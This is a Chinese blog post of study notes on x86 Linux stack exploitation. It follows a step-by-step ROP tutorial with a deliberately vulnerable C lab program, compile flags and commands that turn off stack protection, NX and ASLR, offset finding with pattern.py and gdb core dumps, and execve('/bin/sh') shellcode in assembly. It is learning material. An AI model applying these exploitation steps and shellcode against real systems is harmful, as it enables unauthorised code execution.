<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ROP-x86"><meta name="keywords" content="pwn"><meta name="author" content="LamのCrow"><meta name="copyright" content="LamのCrow"><title>ROP-x86 | LamのCrow</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ROP-x86"><span class="toc-number">1.</span> <span class="toc-text">ROP-x86</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%84"><span class="toc-number">2.</span> <span class="toc-text">附</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Control-Flow-Hijack-%E6%8E%A7%E5%88%B6%E6%B5%81%E5%8A%AB%E6%8C%81"><span class="toc-number">3.</span> <span class="toc-text">Control Flow Hijack (控制流劫持)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">3.1.</span> <span class="toc-text">实验代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-amp-%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">运行 &amp; 确定偏移点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pattern-py"><span class="toc-number">3.2.1.</span> <span class="toc-text">pattern.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB%E7%82%B9"><span class="toc-number">3.2.2.</span> <span class="toc-text">确定偏移点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0shellcode"><span class="toc-number">3.3.</span> <span class="toc-text">构造shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode1"><span class="toc-number">3.3.1.</span> <span class="toc-text">shellcode1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E7%9A%84%E5%A4%A7%E8%87%B4%E5%88%86%E5%B8%83"><span class="toc-number">3.3.2.</span> <span class="toc-text">payload的大致分布</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9Apayload%E5%81%8F%E7%A7%BB"><span class="toc-number">3.4.</span> <span class="toc-text">确定payload偏移</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AFcore-dump"><span class="toc-number">3.4.1.</span> <span class="toc-text">开启core dump</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb%E8%B0%83%E8%AF%95core%E6%96%87%E4%BB%B6"><span class="toc-number">3.4.2.</span> <span class="toc-text">gdb调试core文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E6%96%B0%E7%A1%AE%E5%AE%9Aret-address"><span class="toc-number">3.4.3.</span> <span class="toc-text">重新确定ret_address</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%9B%9E%E9%A1%BE%E8%AE%B0%E5%BD%95"><span class="toc-number">3.4.4.</span> <span class="toc-text">第二次回顾记录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8Clevel1%E7%9A%84core"><span class="toc-number">3.4.4.1.</span> <span class="toc-text">正常运行level1的core</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8pwntools%E8%BF%90%E8%A1%8Clevel1%E7%9A%84core"><span class="toc-number">3.4.4.2.</span> <span class="toc-text">使用pwntools运行level1的core</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99exploit"><span class="toc-number">3.5.</span> <span class="toc-text">编写exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ret2libc-Bypass-DEP-%E9%80%9A%E8%BF%87ret2libc%E7%BB%95%E8%BF%87DEP%E9%98%B2%E6%8A%A4"><span class="toc-number">4.</span> <span class="toc-text">Ret2libc - Bypass DEP (通过ret2libc绕过DEP防护)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-number">4.1.</span> <span class="toc-text">思路总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81-1"><span class="toc-number">4.2.</span> <span class="toc-text">实验代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9Aret-address"><span class="toc-number">4.3.</span> <span class="toc-text">确定ret_address</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81NX%E4%BF%9D%E6%8A%A4"><span class="toc-number">4.4.</span> <span class="toc-text">验证NX保护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level2%E6%A0%88%E6%9D%83%E9%99%90"><span class="toc-number">4.4.1.</span> <span class="toc-text">level2栈权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level1%E6%A0%88%E6%9D%83%E9%99%90"><span class="toc-number">4.4.2.</span> <span class="toc-text">level1栈权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%A2%B3%E7%90%86"><span class="toc-number">4.5.</span> <span class="toc-text">思路梳理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#find-system-amp-%E2%80%9C-bin-sh%E2%80%9D"><span class="toc-number">4.6.</span> <span class="toc-text">find system &amp; “&#x2F;bin&#x2F;sh”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99Exploit"><span class="toc-number">4.7.</span> <span class="toc-text">编写Exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROP-Bypass-DEP-and-ASLR-%E9%80%9A%E8%BF%87ROP%E7%BB%95%E8%BF%87DEP%E5%92%8CASLR"><span class="toc-number">5.</span> <span class="toc-text">ROP - Bypass DEP and ASLR (通过ROP绕过DEP和ASLR)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81-2"><span class="toc-number">5.1.</span> <span class="toc-text">实验代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81ASLR"><span class="toc-number">5.2.</span> <span class="toc-text">验证ASLR</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95level2%E7%9A%84exploit%E8%84%9A%E6%9C%AC"><span class="toc-number">5.2.1.</span> <span class="toc-text">测试level2的exploit脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debug%E8%84%9A%E6%9C%AC"><span class="toc-number">5.2.2.</span> <span class="toc-text">debug脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B1%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4"><span class="toc-number">5.2.3.</span> <span class="toc-text">进程1地址空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B2%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4"><span class="toc-number">5.2.4.</span> <span class="toc-text">进程2地址空间</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASLR%E7%A0%B4%E8%A7%A3%E6%80%9D%E8%B7%AF"><span class="toc-number">5.3.</span> <span class="toc-text">ASLR破解思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8objdump%E6%9F%A5%E7%9C%8BPLT%E4%BF%A1%E6%81%AF"><span class="toc-number">5.4.</span> <span class="toc-text">使用objdump查看PLT信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E9%93%BE%E6%8E%A5%E4%BF%A1%E6%81%AF"><span class="toc-number">5.5.</span> <span class="toc-text">查看链接信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99exploit-1"><span class="toc-number">5.6.</span> <span class="toc-text">编写exploit</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://s4.ax1x.com/2021/12/07/oyWTJA.jpg"></div><div class="author-info__name text-center">LamのCrow</div><div class="author-info__description text-center">欢迎交流!!!</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">41</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">6</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://space.bilibili.com/202089320">MyBIlibili</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://sma11cc.github.io/">smallcc</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://s4.ax1x.com/2021/12/06/oy2VdH.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">LamのCrow</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">ROP-x86</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2024-01-12</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="ROP-x86"><a href="#ROP-x86" class="headerlink" title="ROP-x86"></a>ROP-x86</h1><span id="more"></span>

<p>文章：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000005888964">一步一步学 ROP 之 Linux_x86 篇 - 阿里聚安全 - SegmentFault 思否</a></p>
<p>Lab Code: <a target="_blank" rel="noopener" href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/tree/master">zhengmin1989/ROP_STEP_BY_STEP: 一步一步学ROP (github.com)</a></p>
<p>思维导图: <a href="siyuan://plugins/kmind-plugin?data=%7B%22name%22:%22rop_x86%22%7D">siyuan://plugins/kmind-plugin?data=%7B%22name%22:%22rop_x86%22%7D</a></p>
<p>注意:</p>
<ul>
<li>因为做过修改, 所以命令行的目录路径可能不同, 但是gcc主要的编译参数没有问题.</li>
<li>使用思源编写, 有些超链接是思源的格式, 会出现错误</li>
</ul>
<h1 id="附"><a href="#附" class="headerlink" title="附"></a>附</h1><p>由于思维导图是插件构成, 导出图片</p>
<p><img src="/2024/01/12/ROP_x86_a0faa06e633cf917e7233b696ff7200f/rop_x86_2024_1_12-20240112224514-3rd6aka.png" alt="rop_x86_2024_1_12"></p>
<p>‍</p>
<h1 id="Control-Flow-Hijack-控制流劫持"><a href="#Control-Flow-Hijack-控制流劫持" class="headerlink" title="Control Flow Hijack (控制流劫持)"></a>Control Flow Hijack (控制流劫持)</h1><p>常见的CFH:</p>
<ul>
<li>栈溢出</li>
<li>格式化字符串攻击</li>
<li>堆溢出</li>
</ul>
<p>常见的防御方法:</p>
<ul>
<li>DEP(堆栈不可执行)</li>
<li>ASLR(内存地址随机化)</li>
<li>Stack Protector(栈保护)</li>
</ul>
<h2 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h2><p>该实验没有防护措施, 可以直接攻击</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">        <span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vulnerable_function</span>();</span><br><span class="line">        <span class="built_in">write</span>(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译指令, 关于两个保护:</p>
<ul>
<li>栈溢出保护: Canary在栈中保存一个特殊值, 监视栈是否溢出</li>
<li>堆栈禁止执行: 在CPU层面上启用, 将某些内存区域标记为不可执行.</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z execstack -o level1 level1.c</span><br><span class="line">		     |				   |</span><br><span class="line">		关闭栈溢出保护      关闭堆栈禁止执行</span><br></pre></td></tr></table></figure>

<p>关闭当前Linux系统的ASLR保护</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line">功能: </span><br><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>需要指出的randomize_va_space的功能, 这个文件本质上相当于一个变量, 用于开关ASLR, 变量值就是文件内容, 总共有三种模式:</p>
<ul>
<li>0 = 关闭</li>
<li>1 = 半随机. 共享库, 栈, mmap()以及VDSO将被随机化</li>
<li>2 = 全随机. 在1的基础上加入了堆随机化.</li>
</ul>
<p>参考: <a target="_blank" rel="noopener" href="https://blog.csdn.net/counsellor/article/details/81543197">Linux下关闭ASLR(地址空间随机化)的方法_linux关闭地址随机化-CSDN博客</a></p>
<p>最终的编译指令 (注意由于WSL是x64环境, 所以编译选项中还需要添加-m32来显式指出编译为32位程序.)</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z execstack -m32 -no-pie level1.c -o level1</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h2 id="运行-amp-确定偏移点"><a href="#运行-amp-确定偏移点" class="headerlink" title="运行 &amp; 确定偏移点"></a>运行 &amp; 确定偏移点</h2><h3 id="pattern-py"><a href="#pattern-py" class="headerlink" title="pattern.py"></a>pattern.py</h3><p>实验提供pattern.py代码, 需要使用python2运行.</p>
<p>pattern.py使用说明:</p>
<ul>
<li><p>python2 pattern.py create 150</p>
<ul>
<li>生成长度 = 150的测试字符串</li>
</ul>
</li>
<li><p>python2 pattern.py offset 0x11111111</p>
<ul>
<li>根据内存出错地址判断返回地址的栈偏移, 返回的值就是要填充的长度</li>
</ul>
</li>
</ul>
<h3 id="确定偏移点"><a href="#确定偏移点" class="headerlink" title="确定偏移点"></a>确定偏移点</h3><p>使用pattern.py生成字符串</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 pattern.py create <span class="number">150</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure>

<p>运行程序, 并使用字符串. 返回地址被字符串覆盖, 返回到一个非法地址<code>0x37654136</code>​</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; run                                                                                            │</span><br><span class="line">Starting program: /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level1/level1                                  │</span><br><span class="line">[Thread debugging <span class="keyword">using</span> libthread_db enabled]                                                          │</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.                             │</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3A│</span><br><span class="line">d4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9                                                        │</span><br><span class="line">                                                                                                       │</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.                                                   │</span><br><span class="line"><span class="number">0x37654136</span> in ?? ()</span><br></pre></td></tr></table></figure>

<p>再使用pattern.py识别返回地址, 并确定填充长度</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lamecrow@LAPTOP-PUE31HT9:/mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level1$ python2 pattern.py offset <span class="number">0x37654136</span></span><br><span class="line">hex pattern decoded as: <span class="number">6</span>Ae7</span><br><span class="line"><span class="number">140</span></span><br></pre></td></tr></table></figure>

<h2 id="构造shellcode"><a href="#构造shellcode" class="headerlink" title="构造shellcode"></a>构造shellcode</h2><p>由于程序中没有现成的函数调用<code>execve(&quot;/bin/sh&quot;)</code>​, 所以需要自己构造shellcode.</p>
<p>生成shellcode的方式:</p>
<ul>
<li>Metasploit Framework(MSF)[^1]生成</li>
<li>自行构造并反编译</li>
<li>在<a target="_blank" rel="noopener" href="https://shell-storm.org/">Shell-Storm</a>上查找shellcode</li>
</ul>
<h3 id="shellcode1"><a href="#shellcode1" class="headerlink" title="shellcode1"></a>shellcode1</h3><p>教程中给出的shellcode解析</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#execve (<span class="meta-string">&quot;/bin/sh&quot;</span>)</span></span><br><span class="line"><span class="keyword">xor</span>  ecx, ecx    <span class="meta"># ecx = 0</span></span><br><span class="line">mul  ecx         <span class="meta"># ecx自乘, 0 * 0 = 0, eax = 0</span></span><br><span class="line">push ecx         # 压入一个<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 作为字符串的<span class="string">&#x27;\0&#x27;</span></span><br><span class="line">push <span class="number">0x68732f2f</span>  # 压入字符串</span><br><span class="line">push <span class="number">0x6e69622f</span>  # 压入字符串</span><br><span class="line">mov  ebx, esp    # 字符串指针作为参数<span class="number">1</span></span><br><span class="line">mov  al, <span class="number">11</span>      # 调用号</span><br><span class="line"><span class="keyword">int</span>  <span class="number">0x80</span>        # 系统调用</span><br></pre></td></tr></table></figure>

<h3 id="payload的大致分布"><a href="#payload的大致分布" class="headerlink" title="payload的大致分布"></a>payload的大致分布</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[shellcode][<span class="string">&quot;AAAAAAAAAA...&quot;</span>][ret_address]</span><br><span class="line">^---------------------------------------|</span><br></pre></td></tr></table></figure>

<h2 id="确定payload偏移"><a href="#确定payload偏移" class="headerlink" title="确定payload偏移"></a>确定payload偏移</h2><p>由于栈的内存分布在不同的环境下不同, 所以调试下栈的分布与未调试的栈分布不同. 如果想要执行shellcode, 就需要ret_address返回到正确的字符串头地址.</p>
<h3 id="开启core-dump"><a href="#开启core-dump" class="headerlink" title="开启core dump"></a>开启core dump</h3><p>在未调试的情况下开启Core Dump环境[^2]</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br><span class="line">sudo sh -c <span class="string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后运行程序, 并字符串覆盖返回地址, 构成内存错误, 此时会生成core文件.</p>
<p><strong>注意: 这个内存错误必须是直接执行时触发, 而不是在调试的时候触发.</strong>  (否则core dump下来的还是调试时的栈地址)</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lamecrow@LAPTOP-PUE31HT9:/mnt/e/Try/DownLoad/PWN/Learn/ZMspark/level1$ ./<span class="function">level1</span></span><br><span class="line"><span class="function">ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                                                                                                        </span></span><br><span class="line"><span class="function">Segmentation <span class="title">fault</span> <span class="params">(core dumped)</span>                                                                                                        </span></span><br></pre></td></tr></table></figure>

<h3 id="gdb调试core文件"><a href="#gdb调试core文件" class="headerlink" title="gdb调试core文件"></a>gdb调试core文件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb level1 /tmp/core<span class="number">.1695222277</span></span><br></pre></td></tr></table></figure>

<p>计算栈空间: 由于<code>retn</code>​实际上是<code>pop    eip</code>​, 所以ESP指针在返回地址的下面. 所以字符串的起始地址 = $esp - 144</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---------------</span><br><span class="line">      |</span><br><span class="line">	  |</span><br><span class="line">填充的<span class="number">140</span>个字节</span><br><span class="line">	  |</span><br><span class="line">	  |</span><br><span class="line">---------------</span><br><span class="line">返回地址 (<span class="number">4</span>字节)</span><br><span class="line">---------------  --&gt; ESP</span><br></pre></td></tr></table></figure>

<p>使用gdb查看内存数据, 发现了特征字符串头, 也确定了ret_address = 0xffc7c700</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>s $esp - <span class="number">144</span>                                                                               │</span><br><span class="line"><span class="number">0xffc7c700</span>:     <span class="string">&quot;ABCD&quot;</span>, <span class="string">&#x27;A&#x27;</span> &lt;repeats <span class="number">149</span> times&gt;, <span class="string">&quot;\n\361\367\031\205\313\367\241\312\307\377p&quot;</span>         │</span><br><span class="line"><span class="number">0xffc7c7a6</span>:     <span class="string">&quot;&quot;</span>                                                                                     │</span><br><span class="line"><span class="number">0xffc7c7a7</span>:     <span class="string">&quot;&quot;</span>                                                                                     │</span><br><span class="line"><span class="number">0xffc7c7a8</span>:     <span class="string">&quot;&quot;</span>                                                                                     │</span><br><span class="line"><span class="number">0xffc7c7a9</span>:     <span class="string">&quot;P\361\367\031\205\313\367\001&quot;</span>                                                        │</span><br><span class="line"><span class="number">0xffc7c7b2</span>:     <span class="string">&quot;&quot;</span>                                                                                     │</span><br><span class="line"><span class="number">0xffc7c7b3</span>:     <span class="string">&quot;&quot;</span>                                                                                     │</span><br><span class="line"><span class="number">0xffc7c7b4</span>:     <span class="string">&quot;d\310\307\377l\310\307\377\320\307\307\377&quot;</span>                                           │</span><br><span class="line"><span class="number">0xffc7c7c1</span>:     <span class="string">&quot;\020\354\367\273\221\004\b\001&quot;</span>                                                       │</span><br><span class="line"><span class="number">0xffc7c7ca</span>:     <span class="string">&quot;&quot;</span>                                                                                     │</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="重新确定ret-address"><a href="#重新确定ret-address" class="headerlink" title="重新确定ret_address"></a>重新确定ret_address</h3><p>看错了core文件 (看成了调试的core文件), 导致ret_address一直都是错误的.</p>
<p>ret_address = 0xffffc7b0</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>s $esp - <span class="number">144</span>                                                                               │</span><br><span class="line"><span class="number">0xffffc7b0</span>:     <span class="string">&#x27;1&#x27;</span> &lt;repeats <span class="number">30</span> times&gt;, <span class="string">&#x27;A&#x27;</span> &lt;repeats <span class="number">110</span> times&gt;, <span class="string">&quot;2222\n\310\377\377&quot;</span>                  │</span><br><span class="line"><span class="number">0xffffc845</span>:     <span class="string">&quot;\220\372\367 \320\377\367\031\005\332\367\215\312\377\377p&quot;</span>                           │</span><br><span class="line"><span class="number">0xffffc856</span>:     <span class="string">&quot;&quot;</span>                                                                                     │</span><br><span class="line"><span class="number">0xffffc857</span>:     <span class="string">&quot;&quot;</span>                                                                                     │</span><br><span class="line"><span class="number">0xffffc858</span>:     <span class="string">&quot;&quot;</span>                                                                                     │</span><br><span class="line"><span class="number">0xffffc859</span>:     <span class="string">&quot;\320\377\367\031\005\332\367\001&quot;</span>                                                     │</span><br><span class="line"><span class="number">0xffffc862</span>:     <span class="string">&quot;&quot;</span>                                                                                     │</span><br><span class="line"><span class="number">0xffffc863</span>:     <span class="string">&quot;&quot;</span>                                                                                     │</span><br><span class="line"><span class="number">0xffffc864</span>:     <span class="string">&quot;\024\311\377\377\034\311\377\377\200\310\377\377&quot;</span>                                     │</span><br><span class="line"><span class="number">0xffffc871</span>:     <span class="string">&quot;\220\372\367\273\221\004\b\001&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="第二次回顾记录"><a href="#第二次回顾记录" class="headerlink" title="第二次回顾记录"></a>第二次回顾记录</h3><p>在第二次回顾实验的时候发现, 直接运行level1触发内存异常的core文件的栈地址仍然与pwntools中运行的栈地址不同. 需要在运行pwntools后查看对应的core文件才行.</p>
<h4 id="正常运行level1的core"><a href="#正常运行level1的core" class="headerlink" title="正常运行level1的core"></a>正常运行level1的core</h4><p><img src="/2024/01/12/ROP_x86_a0faa06e633cf917e7233b696ff7200f/image-20240112194930-lg8i0w5.png" alt="image"></p>
<h4 id="使用pwntools运行level1的core"><a href="#使用pwntools运行level1的core" class="headerlink" title="使用pwntools运行level1的core"></a>使用pwntools运行level1的core</h4><p><img src="/2024/01/12/ROP_x86_a0faa06e633cf917e7233b696ff7200f/image-20240112195123-nw9phjg.png" alt="image"></p>
